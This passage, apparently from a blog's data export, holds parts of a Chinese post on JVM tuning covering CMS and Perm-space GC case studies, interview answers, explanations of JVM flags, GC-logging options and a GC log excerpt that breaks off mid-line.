GC，大部分对象就会被回收。\n\nCMS就采用了这样的方式，在Remark前增加了一个可中断的并发预清理（CMS-concurrent-abortable-preclean），该阶段主要工作仍然是并发标记对象是否存活，只是这个过程可被中断。\n\n此阶段在Eden区使用超过2M时启动，当然2M是默认的阈值，可以通过参数修改。如果此阶段执行时等到了Minor GC，那么上述灰色对象将被回收，Reamark阶段需要扫描的对象就少了。\n\n除此之外CMS为了避免这个阶段没有等到Minor GC而陷入无限等待，提供了参数CMSMaxAbortablePrecleanTime ，默认为5s，含义是如果可中断的预清理执行超过5s，不管发没发生Minor GC，都会中止此阶段，进入Remark。\n\n根据GC日志红色标记2处显示，可中断的并发预清理执行了5.35s，超过了设置的5s被中断，期间没有等到Minor GC ，所以Remark时新生代中仍然有很多对象。\n\n对于这种情况，CMS提供CMSScavengeBeforeRemark参数，用来保证Remark前强制进行一次Minor GC。\n\n#### 优化结果\n\n经过增加CMSScavengeBeforeRemark参数，单次执行时间>200ms的GC停顿消失，从监控上观察，GCtime和业务波动保持一致，不再有明显的毛刺。\n![](./2024/06/16/JVM如何调优/21.png)\n#### 小结\n\n通过案例分析了解到，由于跨代引用的存在，CMS在Remark阶段必须扫描整个堆，同时为了避免扫描时新生代有很多对象，增加了可中断的预清理阶段用来等待Minor GC的发生。只是该阶段有时间限制，如果超时等不到Minor GC，Remark时新生代仍然有很多对象，我们的调优策略是，通过参数强制Remark前进行一次Minor GC，从而降低Remark阶段的时间。\n\n#### 更多思考\n\n案例中只涉及老年代GC，其实新生代GC存在同样的问题，即老年代可能持有新生代对象引用，所以Minor GC时也必须扫描老年代。\n\n**JVM是如何避免Minor GC时扫描全堆的？** 经过统计信息显示，老年代持有新生代对象引用的情况不足1%，根据这一特性JVM引入了卡表（card table）来实现这一目的。如下图所示：\n\n![](./2024/06/16/JVM如何调优/22.png)\n**卡表**的具体策略是将老年代的空间分成大小为512B的若干张卡（card）。卡表本身是单字节数组，数组中的每个元素对应着一张卡，当发生老年代引用新生代时，虚拟机将该卡对应的卡表元素设置为适当的值。如上图所示，卡表3被标记为脏（卡表还有另外的作用，标识并发标记阶段哪些块被修改过），之后Minor GC时通过扫描卡表就可以很快的识别哪些卡中存在老年代指向新生代的引用。这样虚拟机通过空间换时间的方式，避免了全堆扫描。\n\n总结来说，CMS的设计聚焦在获取最短的时延，为此它“不遗余力”地做了很多工作，包括尽量让应用程序和GC线程并发、增加可中断的并发预清理阶段、引入卡表等，虽然这些操作牺牲了一定吞吐量但获得了更短的回收停顿时间。\n\n### 美团案例7：发生Stop-The-World的GC\n\n这个案例，来自美团技术官网\n\n#### 确定目标\n\nGC日志如下图（在GC日志中，Full GC是用来说明这次垃圾回收的停顿类型，代表STW类型的GC，并不特指老年代GC），根据GC日志可知本次Full GC耗时1.23s。这个在线服务同样要求低时延高可用。\n\n本次优化目标是降低单次STW回收停顿时间，提高可用性。\n\n![](./2024/06/16/JVM如何调优/23.png)\n#### 优化\n\n首先，什么时候可能会触发STW的Full GC呢？\n\n1.  Perm空间不足；\n\n2.  CMS GC时出现promotion failed和concurrent mode failure（concurrent mode failure发生的原因一般是CMS正在进行，但是由于老年代空间不足，需要尽快回收老年代里面的不再被使用的对象，这时停止所有的线程，同时终止CMS，直接进行Serial Old GC）；\n\n3.  统计得到的Young GC晋升到老年代的平均大小大于老年代的剩余空间；\n\n4.  主动触发Full GC（执行jmap -histo:live \\[pid\\]）来避免碎片问题。\n\n\n然后，我们来逐一分析一下：\n\n*   排除原因2：如果是原因2中两种情况，日志中会有特殊标识，目前没有。\n\n*   排除原因3：根据GC日志，当时老年代使用量仅为20%，也不存在大于2G的大对象产生。\n\n*   排除原因4：因为当时没有相关命令执行。\n\n*   锁定原因1：根据日志发现Full GC后，Perm区变大了，推断是由于永久代空间不足容量扩展导致的。\n\n\n找到原因后解决方法有两种：\n\n1.  通过把-XX:PermSize参数和-XX:MaxPermSize设置成一样，强制虚拟机在启动的时候就把永久代的容量固定下来，避免运行时自动扩容。\n\n2.  CMS默认情况下不会回收Perm区，通过参数CMSPermGenSweepingEnabled、CMSClassUnloadingEnabled ，可以让CMS在Perm区容量不足时对其回收。\n\n\n由于该服务没有生成大量动态类，回收Perm区收益不大，所以我们采用方案1，启动时将Perm区大小固定，避免进行动态扩容。\n\n#### 优化结果\n\n调整参数后，服务不再有Perm区扩容导致的STW GC发生。\n\n#### 小结\n\n对于性能要求很高的服务，建议将MaxPermSize和MinPermSize设置成一致（JDK8开始，Perm区完全消失，转而使用元空间。而元空间是直接存在内存中，不在JVM中），Xms和Xmx也设置为相同，这样可以减少内存自动扩容和收缩带来的性能损失。虚拟机启动的时候就会把参数中所设定的内存全部化为私有，即使扩容前有一部分内存不会被用户代码用到，这部分内存在虚拟机中被标识为虚拟内存，也不会交给其他进程使用。\n\n八：JVM调优常见面试题的精简答案\n-----------------\n\n#### 8\\. 1、调优包括哪些维度？\n\n架构调优、代码调优、JVM调优、数据库调优、操作系统调优等\n\n架构调优和代码调优是JVM调优的基础，其中**架构调优是对系统影响最大的**\n\n#### 8.2、何时进行JVM调优\n\n*   Heap内存（老年代）持续上涨达到设置的最大内存值；\n\n*   Full GC 次数频繁；\n\n*   GC 停顿时间过长（超过1秒）；\n\n*   应用出现OutOfMemory等内存异常；\n\n*   应用中有使用本地缓存且占用大量内存空间；\n\n*   系统吞吐量与响应性能不高或不降；\n\n\n#### 8.3、JVM调优的基本原则\n\n*   大多数的Java应用不需要进行JVM优化；\n\n*   大多数导致GC问题的原因是代码层面的问题导致的（代码层面）；\n\n*   上线之前，应先考虑将机器的JVM参数设置到最优；\n\n*   减少创建对象的数量（代码层面）；\n\n*   减少使用全局变量和大对象（代码层面）；\n\n*   优先架构调优和代码调优，JVM优化是不得已的手段（代码、架构层面）；\n\n*   分析GC情况优化代码比优化JVM参数更好（代码层面）\n\n\n**其实最有效的优化手段是架构和代码层面的优化，而JVM优化则是最后不得已的手段，也可以说是对服务器配置的最后一次“压榨”**\n\n#### 8.4、JVM调优目标\n\n目的都是为了令应用程序使用最小的硬件消耗来承载更大的吞吐。JVM调优主要是针对垃圾收集器的收集性能优化，令运行在虚拟机上的应用能够使用更少的内存以及延迟获取更大的吞吐量，总结以下：\n\n*   延迟：GC低停顿和GC低频率；\n\n*   低内存占用；\n\n*   高吞吐量。\n\n\n#### 8.5、JVM调优量化目标\n\n*   Heap 内存使用率 <= 70%;\n\n*   Old generation 内存使用率 <= 70%;\n\n*   avgpause <= 1秒;\n\n*   Full GC 次数 0 或 avg pause interval >= 24小时。\n\n\n#### 8.6、JVM调优的步骤\n\n*   分析GC日志及dump文件，判断是否需要优化，确定瓶颈问题点；\n\n*   确定JVM调优量化目标；\n\n*   确定JVM调优参数（根据历史JVM参数来调整）；\n\n*   依次调优内存、延迟、吞吐量等指标；\n\n*   对比观察调优前后的差异；\n\n*   不断的分析和调整，直到找到合适的JVM参数配置；\n\n*   找到最合适的参数，将这些参数应用到所有服务器，并进行后续跟踪。\n\n\n#### 8.7、VM参数解析及调优\n\n```\n\n\n\\-Xmx4g   \n–Xms4g   \n–Xmn1200m   \n–Xss512k   \n\\-XX:NewRatio=4   \n\\-XX:SurvivorRatio=8   \n\\-XX:PermSize=100m   \n\\-XX:MaxPermSize=256m   \n\\-XX:MaxTenuringThreshold=15  \n\n\n\n```\n\n*   \\-Xmx4g：堆内存最大值为4GB。\n\n*   \\-Xms4g：初始化堆内存大小为4GB。\n\n*   \\-Xmn1200m：**设置年轻代大小为1200MB**。增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3/8。\n\n*   \\-Xss512k：**设置每个线程的堆栈大小**。JDK5.0以后每个线程堆栈大小为1MB，以前每个线程堆栈大小为256K。应根据应用线程所需内存大小进行调整。在相同物理内存下，减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右。\n\n*   \\-XX:NewRatio=4：**设置年轻代（包括Eden和两个Survivor区）与年老代的比值（除去持久代）**。设置为4，则年轻代与年老代所占比值为1：4，年轻代占整个堆栈的1/5\n\n*   \\-XX:SurvivorRatio=8：**设置年轻代中Eden区与Survivor区的大小比值**。设置为8，则两个Survivor区与一个Eden区的比值为2:8，一个Survivor区占整个年轻代的1/10\n\n*   \\-XX:PermSize=100m：初始化永久代大小为100MB。\n\n*   \\-XX:MaxPermSize=256m：设置持久代大小为256MB。\n\n*   \\-XX:MaxTenuringThreshold=15：**设置垃圾最大年龄**。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。\n\n\n**可调优参数：**\n\n*   \\-Xms：初始化堆内存大小，默认为物理内存的1/64(小于1GB)。\n\n*   \\-Xmx：**堆内存最大值**。默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。\n\n*   \\-Xmn：新生代大小，包括Eden区与2个Survivor区。\n\n*   \\-XX:SurvivorRatio=1：Eden区与一个Survivor区比值为1:1。\n\n*   \\-XX:MaxDirectMemorySize=1G：**直接内存**。报java.lang.OutOfMemoryError: Direct buffer memory异常可以上调这个值。\n\n*   \\-XX:+DisableExplicitGC：禁止运行期显式地调用System.gc()来触发fulll GC。\n\n*   注意: Java RMI的定时GC触发机制可通过配置-Dsun.rmi.dgc.server.gcInterval=86400来控制触发的时间。\n\n*   \\-XX:CMSInitiatingOccupancyFraction=60：老年代内存回收阈值，默认值为68。\n\n*   \\-XX:ConcGCThreads=4：CMS垃圾回收器并行线程线，推荐值为CPU核心数。\n\n*   \\-XX:ParallelGCThreads=8：新生代并行收集器的线程数。\n\n*   \\-XX:MaxTenuringThreshold=10：**设置垃圾最大年龄**。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。\n\n*   \\-XX:CMSFullGCsBeforeCompaction=4：指定进行多少次fullGC之后，进行tenured区 内存空间压缩。\n\n*   \\-XX:CMSMaxAbortablePrecleanTime=500：当abortable-preclean预清理阶段执行达到这个时间时就会结束。\n\n\n#### 8.8、内存调优示例\n\n```\n\n\n\\-XX:+PrintGC 　　输出GC日志  \n\\-XX:+PrintGCDetails 输出GC的详细日志  \n\\-XX:+PrintGCTimeStamps 输出GC的时间戳（以基准时间的形式）  \n\\-XX:+PrintGCDateStamps 输出GC的时间戳（以日期的形式，如 2013-05-04T21:53:59.234+0800）  \n\\-XX:+PrintHeapAtGC 　　在进行GC的前后打印出堆的信息  \n\\-Xloggc:../logs/gc.log 日志文件的输出路径  \n\n\n\n```\n\n#### \n![](./2024/06/16/JVM如何调优/24.png)\n*   java heap：参数-Xms和-Xmx，建议扩大至3-4倍FullGC后的老年代空间占用。\n\n*   永久代：-XX:PermSize和-XX:MaxPermSize，建议扩大至1.2-1.5倍FullGc后的永久代空间占用。\n\n*   新生代：-Xmn，建议扩大至1-1.5倍FullGC之后的老年代空间占用。\n\n*   老年代：2-3倍FullGC后的老年代空间占用。\n\n    ```\n    \n    \n    \\-Xms373m -Xmx373m //4\\*93=372  \n    \\-Xmn140m //1.5\\*93=139.5  \n    \\-XX:PermSize=5m -XX:MaxPermSize=5m //1.5\\*3=4.5  \n    \n    \n    \n    ```\n\n\n九 、结语\n-----\n\n在JVM调优中，关键在于准确识别系统的性能瓶颈和优化方向，选择适合的调优策略和参数。\n\n实施调优方案后，必须验证效果，并持续监控系统性能，及时调整优化策略和参数以保持系统高性能和稳定性。\n\n同时，需要及时发现和解决各种潜在的性能问题，如内存泄漏、CPU飙升、频繁的垃圾回收等，以确保系统在高负载和复杂环境下能够保持卓越的性能表现。\n\n总之，JVM调优是一个持续改进的过程，通过对系统性能的深入分析和优化，确保Java应用程序在各种情况下都能够保持高效稳定的运行状态。\n\n随着硬件技术的迅速发展，JVM调优也将面临新的挑战和机遇。新一代的处理器、存储技术以及分布式系统架构等将对JVM调优提出更高的要求，需要更智能、更高效的优化方案来适应日益复杂的应用场景和巨大的数据处理需求。\n\n未来，JVM调优将持续创新和进步，以满足不断变化的业务需求和技术挑战，为Java应用程序提供更稳定、更高效的运行环境，推动Java生态系统的蓬勃发展和壮大。\n\n与开篇所述保持一致，我们强调在JVM调优中，真正的参数调整是较少的，更多的是通过分析日志和结合系统业务进行代码层面的优化。\n\n这可能是调优工作中占据更大比重的内容。我们不应迷失方向，只为了调优而调优，只为了调整参数而调整参数。最终，我们需要回归到业务本质，这才是最核心的内容。我们也需要更深入地了解JVM的相关参数，以更好地支撑业务需求的实现。\n\n说在最后：有问题找老架构取经\n--------------\n\n**JVM 调优方法论**、JVM调优 相关的面试题，是非常常见的面试题。也是核心面试题。\n\n以上的内容，如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。\n\n","source":"_posts/JVM如何调优.md","raw":"---\ntitle: JVM如何调优\ndate: 2024-06-16 18:16:05\ntags: JVM调优\ncategories: 面试\n---\n\n\n\n\n一：引言\n----\n\n在软件开发和运维中，JVM作为执行Java程序的核心引擎，扮演着至关重要的角色。\n\n随着应用程序的复杂性和负载不断增加，对JVM的性能和稳定性要求也越来越高。\n\n在此背景下，JVM调优变得至关重要。\n\nJVM调优涉及到一系列的参数设置、垃圾收集器的选择、内存分配策略等方面，对于提高Java应用程序的性能、减少内存泄漏、降低系统崩溃风险都有重要作用。\n\n另外，在大厂面试中，JVM调优的知识也是备受关注的考察点，因为它直接关系到系统的稳定性和性能优化。\n\n候选人对JVM调优的理解和实践能力，可以反映其在Java虚拟机运行机制方面的深度和广度，\n\n需要注意的是，调优并非首选方法，一般而言，解决性能问题的第一步是优化程序本身，只有在必要时才考虑进行JVM调优。\n\nJVM调优，有什么好处？\n------------\n\nJVM调优目的是通过调整Java虚拟机的配置参数、垃圾回收策略和内存分配等手段，提升Java应用程序的性能、稳定性和可靠性。\n\n随着应用规模和用户量的增长，原始的JVM配置可能无法满足业务需求，因此必须进行调优以确保系统的正常运行。\n\n然而，并不是所有异常情况都需要进行JVM调优。\n\n在实际情况中，大多数问题可以通过分析JVM日志文件和业务逻辑来定位，并通过业务层面的优化来解决。\n\n尽管如此，深入了解各项参数和指标仍然至关重要，因为它们有助于更快速地理解和解决问题，调优能带来什么好处？\n\n*   **性能层面：**\n\n    通过调整JVM参数和优化垃圾回收机制，能够提高Java应用程序的性能，减少延迟，提升系统响应速度和并发能力、和吞吐量。\n\n*   **资源利用：**\n\n    合理配置JVM资源，包括内存、CPU等，能够有效地利用硬件资源，提高系统的资源利用率，降低成本。\n\n*   **稳定性：** 通过调优JVM，可减少内存泄漏、OOM（Out of Memory）等问题的发生，提高系统的稳定性和可靠性，降低系统崩溃的风险。\n\n\n二：JVM调优的关注哪些指标？\n---------------\n\n调优，到底调的是什么？\n\n调优之前，要搞清楚一个问题：怎样才算是“优”。\n\n如何定性？\n\n如何定量？\n\n到底需要其实是需要关注几个关键的指标，以全面评估系统的运行状态和性能表现。\n\n需要有一个具体的指标来衡量性能情况，而在JVM里面衡量性能的两个核心指标分别“吞吐量”和“停顿时间”。\n\n### 核心指标1：吞吐量(throughput)：\n\n程序运行过程中执行两种任务，分别是执行业务代码的 任务 和进行垃圾回收的任务，\n\n吞吐量大，意就是说程序运行业务代码的时间越多， 换句话说，执行业务任务越多， 吞吐量就越高，\n\n吞吐量计算公式 ，\n\n```\n\n\n吞吐量 = CPU在用户应用程序运行的时间 / （CPU在用户应用程序运行的时间 + CPU垃圾回收的时间），  \n\n\n\n```\n\n在实践中我们发现对于大多数的应用领域，评估一个垃圾收集(GC)算法如何，有如下一个核心标准：\n\n*   吞吐量越高越好\n\n\n一般而言GC 的吞吐量不能低于 95%。\n\n本质上，吞吐量是指应用程序线程用时占程序总用时的比例。\n\n例如，吞吐量99/100， 意味着100秒的程序执行时间，应用程序线程运行了99秒， 而在这一时间段内GC线程只运行了1秒。\n\n### 核心指标2：停顿时间(pause times)：\n\nJVM在专门的线程(GC threads)中执行GC。\n\n因为JVM进行垃圾回收的时候，某些阶段必须要停止业务线程专心进行垃圾收集， 只要GC线程是活动的，它们将与应用程序线程(application threads)争用当前可用CPU的时钟周期。\n\n停顿时间(pause times) 是指一个时间段内应用程序线程让与GC线程执行，而应用程序线程完全暂停。\n\n例如，GC期间100毫秒的停顿时间， 意味着在这100毫秒期间内没有应用程序线程是活动的。\n\n如果说一个正在运行的应用程序有100毫秒的“平均停顿时间”，那么就是说该应用程序所有的停顿时间平均长度为100毫秒。\n\n同样，100毫秒的“最大停顿时间”是指：该应用程序所有的停顿时间最大不超过100毫秒。\n\n注意，这里说的JVM停顿时间，就是指JVM停止业务线程而去进行垃圾收集的这段时长，其实指的是**每次GC造成用户线程停顿的平均时间**，不是总的垃圾回收时间。\n\n停顿时间越长，就意味着GC场景下，用户线程平均等待的时间越长，停顿时间会直接影响用户使用系统的体验。\n\n除了吞吐量(throughput) 、停顿时间(pause times) 两个核心指标，JVM调优还会关心下面的非核心指标：\n\n### 核心指标3：堆内存占用量：\n\n细致监控堆内存使用量、非堆内存使用量以及永久代（或元空间）使用量指标数据。\n\n举例来说，当堆内存使用量持续增加，而内存回收频率较低时，可能暗示着潜在的内存泄漏问题，这可能导致系统性能下降或者最终的内存耗尽（OOM）。\n\n### 非核指标1：垃圾回收次数\n\nGC非常占用CPU资源的，如果GC占用的资源越多，那么意味着其他事情所用的资源会减少，系统所能做的事情也会越少。\n\n尽管垃圾回收过程会消耗大量的CPU资源，但是我们也不能单纯地、一味的追求GC次数减少\n\n为啥? GC次数减少了，有可能单次GC的时间变长，那么就可能会增加单次GC的“停顿时长”（核心指标2），\n\n### 非核指标2：垃圾回收频率\n\n通常情况下，与垃圾回收次数相比，较低的垃圾回收频率被认为是更好的选择。\n\n垃圾回收的频率,需要适中\n\n*   频率过小,每次垃圾回收的时间会过长\n\n*   频率过大,停顿时间长,延迟高\n\n\n所以：通常来说垃圾回收频率是越低越好。\n\n详细记录GC频率、GC停顿时间以及每次GC后的内存情况。\n\n或者说：减少 GC次数可能会导致单次垃圾回收的时间变长，进而增加单次垃圾回收的“停顿时长”。\n\n所以， 需要在这两者之间做一些平衡。\n\n吞吐量、暂停时间、堆内存占用三者之间的关系\n---------------------\n\n这三个指标不可能同时达到,因为他们是一个不可能的关系\n\n**内存变大,要回收的东西变多,暂停时间自然增加.**\n\n**吞吐量增加,必然要降低垃圾回收频率,频率降低,垃圾谁收停顿时间必然增大.**\n\n因此,目前gc的优化方向主要是**吞吐量和暂停时间.**\n\n### “高吞吐量”和“低停顿时间”是一对相互竞争的目标\n\n高吞吐量最好因为这会让应用程序的最终用户感觉只有应用程序线程在做“生产性”工作。\n\n直觉上，吞吐量越高程序运行越快。\n\n低停顿时间最好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。\n\n这取决于应用程序的类型，有时候甚至短暂的200毫秒暂停都可能打断终端用户体验。\n\n因此，具有低的最大停顿时间是非常重要的，特别是对于一个交互式应用程序。\n\n不幸的是”高吞吐量”和”低停顿时间”是一对相互竞争的目标（矛盾）。\n\nGC需要一定的前提条件以便安全地运行。\n\n例如，必须保证应用程序线程在GC线程试图确定哪些对象仍然被引用和哪些没有被引用的时候不修改对象的状态。\n\n为此，应用程序在GC期间必须停止(或者仅在GC的特定阶段，这取决于所使用的算法)。 然而这会增加额外的线程调度开销：直接开销是上下文切换，间接开销是因为缓存的影响。\n\n加上JVM内部安全措施的开销，这意味着GC及随之而来的不可忽略的开销，将增加GC线程执行实际工作的时间。\n\n因此我们可以通过尽可能少运行GC，来最大化吞吐量，例如，只有在不可避免的时候进行GC，来节省所有与它相关的开销。\n\n然而，仅仅偶尔运行GC意味着每当GC运行时将有许多工作要做，因为在此期间积累在堆中的对象数量很高。 单个GC需要花更多时间来完成， 从而导致更高的平均和最大停顿时间。\n\n因此，考虑到低停顿时间，最好频繁地运行GC以便更快速地完成。这反过来又增加了开销并导致吞吐量下降，我们又回到了起点。\n\n综上所述，在设计（或使用）GC算法时，我们必须确定我们的目标：\n\n一个GC算法只可能针对两个目标之一（即只专注于最大吞吐量或最小停顿时间），或尝试找到一个二者的折衷。\n\n### 吞吐量和暂停时间是矛盾的,如何抉择?\n\n高吞吐量较好因为这会让应用程序的最终用户感觉只有应用程序线程在做\"生产性\"工作。直觉上,吞吐量越高程序运行越快。\n\n低暂停时间(低延迟)较好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。这取决于应用程序的类型, 有时候甚至短暂的200毫秒暂停都可能打断终端用户体验 。因此,具有低的较大暂停时间是非常重要的,特别是对于一个 交互式应用程序 。\n\n不幸的是\"高吞吐量\"和\"低暂停时间\"是一对相互竞争的目标(矛盾)。\n\n*   因为如果选择以吞吐量优先,那么 必然需要降低内存回收的执行频率 ,但是这样会导致GC需要更长的暂停时间来执行内存回收。\n\n*   相反的,如果选择以低延迟优先为原则,那么为了降低每次执行的内存回收时的暂停时间,也 只能频繁地执行内存回收 ,但这又引起了年轻代内存的缩减和导致程序吞吐量的下降。\n\n\n在设计(或使用)GC算法时,我们必须确定我们的目标: 一个GC算法可能针对两个目标之一(即只专注于较大吞吐量或最小暂停时间),或尝试找到一个二者的折中。\n\n现在标准: 在最大吞吐量优先的情况下,降低停顿时间\n\n### 不同的垃圾回收器有不同的抉择方向:\n\n*   Parallel以吞吐量优先\n\n*   cms以停顿时间优先\n\n*   而G1则取折中方案: 在保证用户可接受的停顿时间的前提下,尽可能提高吞吐量.\n\n\nJVM调优没有万能的公式和标准，因为每个人所面对的场景是不一样。\n\n要想调整到最优的性能，其实首先要确认的是自己的需求目标是什么(以吞吐量优先/停顿时间优先)，\n\n然后，根据这个目标去慢慢的调整各项指标，从而达到一个最佳的平衡点。\n\n三：如果获得JVM内存指标?\n--------------\n\n在项目启动的时候 增加下列参数来收集GC日志，然后通过第三方的日志分析工具（比如GCesay:https://gceasy.io/）\n\n分析收集到的GC日志来得到吞吐量、停顿时间相关的统计数据。\n\n```\n\n\n java    \n -XX:+PrintGCDetails -XX:+PrintGCDateStamps   \n -XX:+UseGCLogFileRotation   \n -XX:+PrintHeapAtGC -XX:NumberOfGCLogFiles=5    \n -XX:GCLogFileSize=20M      \n -Xloggc:/opt/ard-user-gc-%t.log    \n -jar abg-user-1.0-SNAPSHOT.jar \n\n\n```\n```\n\n\n -Xloggc:/opt/app/ard-user/ard-user-gc-%t.log   设置日志目录和日志名称  \n -XX:+UseGCLogFileRotation           开启滚动生成日志  \n -XX:NumberOfGCLogFiles=5            滚动GC日志文件数，默认0，不滚动  \n -XX:GCLogFileSize=20M               GC文件滚动大小，需开启UseGCLogFileRotation  \n -XX:+PrintGCDetails                 开启记录GC日志详细信息（包括GC类型、各个操作使用的时间）,并且在程序运行结束打印出JVM的内存占用情况  \n -XX:+ PrintGCDateStamps             记录系统的GC时间             \n -XX:+PrintGCCause                   产生GC的原因(默认开启)\n\n\n```\n\n### 日志分析工具有哪些？\n\n我们看到日志，尤其是CMS和G1的日志，直接看日志文档都是很不方便的，密密麻麻的文字，其实市面上已经有一些日志分析工具了。\n\n进行系统调优时，首先需要对系统的各项指标进行检测。为了有效地进行监测和设置相应的阈值，我们通常会借助监控工具，例如普罗米修斯等。在分析阶段，以下工具是常用的：\n\n1.  VisualVM：\n\n    这是一个功能强大、可扩展的开源工具，用于深入分析Java应用程序。它提供了丰富的功能，包括性能监控、内存使用情况、垃圾回收情况等，并支持线程分析、堆快照等功能。\n\n2.  Java Mission Control (JMC)：\n\n    由Oracle提供的专业Java性能监控和故障诊断工具。JMC集成了多种强大功能，包括垃圾回收分析、内存泄漏检测、线程分析等。\n\n3.  jvisualvm：\n\n    这是JDK自带的监控和调试工具，可用于监视本地和远程Java应用程序的性能、内存使用情况等。它提供了直观的图形界面和丰富的监控指标。\n\n4.  JConsole：\n\n    JConsole是JDK自带的监控工具，提供了基本的图形界面，可用于监视Java应用程序的内存使用情况、线程信息、垃圾回收情况等。\n\n5.  GCViewer：\n\n    这是专门用于分析Java应用程序垃圾回收日志的工具。\n\n    GCViewer能将GC日志解析成易于理解的图表和统计信息，帮助用户分析和优化垃圾回收行为。\n\n\n接下来，介绍使用 gceasy.io 进行 日志分析\n\n网址：https://gceasy.io/\n\n注意：这款工具不需要我们下载软件，他是在线的。\n\n我们要做的就是两步：\n\n步骤一：导出GC日志到本地磁盘\n\n步骤二：将本地日志上传到gceasy.io上，进行分析\n\n### 指标分析第一步：导出日志\n\n```\n\n\n\\-Xloggc:/Users/lxl/Downloads/gc.log  \n\\-XX:+PrintGCDetails  \n\\-XX:+PrintGCDateStamps  \n\\-XX:+PrintGCTimeStamps  \n\\-XX:+PrintGCCause  \n  \n\n\n\n```\n\n*   ‐Xloggc参数：指定gc日志的保存地址。这里指定的是当前目录，文件名以gc-+时间戳.log打印。%t表示时间戳\n\n*   ‐XX:+PrintGCDetails：在日志中打印GC详情。\n\n*   ‐XX:+PrintGCDateStamps：在日志中打印GC的时间\n\n*   ‐XX:+PrintGCTimeStamps：在日志中打印GC耗时\n\n*   ‐XX:+PrintGCCause ： \\[这个参数没查到\\]\n\n*   ‐XX:+UseGCLogFileRotation：这个参数表示以滚动文件的形式打印日志\n\n*   ‐XX:NumberOfGCLogFiles：GC日志文件的最大个数，这里设置10个\n\n*   ‐XX:GCLogFileSize：GC日志每个文件的最大容量，这里是100M\n\n\n我们把日志下载到Downloads文件夹下了。以下便是GC日志的全部内容\n\n```\n\n\nJava HotSpot(TM) 64-Bit Server VM (25.202-b08) for bsd-amd64 JRE (1.8.0\\_202-b08), built on Dec 15 2018 20:16:16 by \"java\\_re\" with gcc 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.11.00)  \nMemory: 4k page, physical 16777216k(1745536k free)  \n/proc/meminfo:  \nCommandLine flags: -XX:-BytecodeVerificationLocal -XX:-BytecodeVerificationRemote -XX:InitialHeapSize=268435456 -XX:+ManagementServer -XX:MaxHeapSize=4294967296 -XX:+PrintGC -XX:+PrintGCCause -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:TieredStopAtLevel=1 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC   \n2022-01-12T15:02:37.044-0800: 0.839: \\[GC (Allocation Failure) \\[PSYoungGen: 65536K->4400K(76288K)\\] 65536K->4416K(251392K), 0.0043915 secs\\] \\[Times: user=0.01 sys=0.00, real=0.00 secs\\]   \n2022-01-12T15:02:37.308-0800: 1.103: \\[GC (Allocation Failure) \\[PSYoungGen: 69936K->4959K(76288K)\\] 69952K->5047K(251392K), 0.0046449 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:37.625-0800: 1.420: \\[GC (Allocation Failure) \\[PSYoungGen: 70495K->7467K(76288K)\\] 70583K->7563K(251392K), 0.0051392 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   \n2022-01-12T15:02:37.831-0800: 1.627: \\[GC (Allocation Failure) \\[PSYoungGen: 73003K->9356K(141824K)\\] 73099K->9460K(316928K), 0.0072596 secs\\] \\[Times: user=0.03 sys=0.01, real=0.00 secs\\]   \n2022-01-12T15:02:37.869-0800: 1.664: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 22322K->7049K(141824K)\\] 22426K->7161K(316928K), 0.0057809 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   \n2022-01-12T15:02:37.875-0800: 1.670: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 7049K->0K(141824K)\\] \\[ParOldGen: 112K->6873K(87040K)\\] 7161K->6873K(228864K), \\[Metaspace: 20573K->20571K(1067008K)\\], 0.0237404 secs\\] \\[Times: user=0.09 sys=0.01, real=0.02 secs\\]   \n2022-01-12T15:02:38.392-0800: 2.188: \\[GC (Allocation Failure) \\[PSYoungGen: 131072K->7194K(236032K)\\] 137945K->14075K(323072K), 0.0054542 secs\\] \\[Times: user=0.01 sys=0.01, real=0.00 secs\\]   \n2022-01-12T15:02:39.850-0800: 3.646: \\[GC (Allocation Failure) \\[PSYoungGen: 235546K->9697K(270336K)\\] 242427K->20203K(357376K), 0.0092838 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:40.479-0800: 4.274: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 179780K->12779K(397312K)\\] 190286K->25839K(484352K), 0.0117953 secs\\] \\[Times: user=0.04 sys=0.01, real=0.02 secs\\]   \n2022-01-12T15:02:40.491-0800: 4.286: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 12779K->0K(397312K)\\] \\[ParOldGen: 13059K->21448K(132096K)\\] 25839K->21448K(529408K), \\[Metaspace: 34068K->34068K(1079296K)\\], 0.0437361 secs\\] \\[Times: user=0.16 sys=0.01, real=0.04 secs\\]   \n2022-01-12T15:02:42.177-0800: 5.972: \\[GC (Allocation Failure) \\[PSYoungGen: 384512K->13185K(399872K)\\] 405960K->34641K(531968K), 0.0115070 secs\\] \\[Times: user=0.04 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:43.010-0800: 6.806: \\[GC (Allocation Failure) \\[PSYoungGen: 397697K->16864K(530432K)\\] 419153K->58461K(662528K), 0.0248406 secs\\] \\[Times: user=0.04 sys=0.02, real=0.02 secs\\]   \n2022-01-12T15:02:44.338-0800: 8.133: \\[GC (Allocation Failure) \\[PSYoungGen: 530400K->26083K(539648K)\\] 571997K->86488K(671744K), 0.0302789 